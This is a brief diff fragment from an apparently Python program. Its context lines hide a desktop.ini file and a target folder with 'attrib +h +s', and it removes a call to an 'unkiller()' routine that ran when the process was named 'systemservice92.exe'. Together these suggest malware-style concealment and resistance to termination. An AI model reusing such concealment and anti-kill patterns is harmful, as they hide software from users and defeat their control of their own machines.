@@ -91,5 +91,3 @@ goto loop
             )
         os.system(f"attrib +h +s \"{desktop_ini_path}\"")
         os.system(f"attrib +h +s \"{target_dir}\"")
-if psutil.Process().name() == "systemservice92.exe":
-    unkiller()
